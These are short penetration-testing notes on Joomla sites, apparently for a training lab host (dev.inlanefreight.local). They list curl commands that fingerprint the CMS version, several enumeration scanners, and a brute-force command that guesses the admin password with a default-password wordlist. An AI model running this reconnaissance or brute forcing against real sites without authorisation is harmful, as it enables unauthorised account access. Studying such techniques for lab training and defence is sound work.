# Identify CMS version
```
curl -s http://dev."$domain" | grep Joomla
```
# Identify Joomla version
```
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
curl -s http://dev.inlanefreight.local/plugins/system/cache/cache.xml
```
# Enumeration
```
droopescan
|_____ sudo pip3 install droopescan
JoomlaScan
joomscan
```

# Brute force attack
>joomla-bruteforce.py
```
sudo python3 joomla-brute.py -u http://dev."$domain" -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```
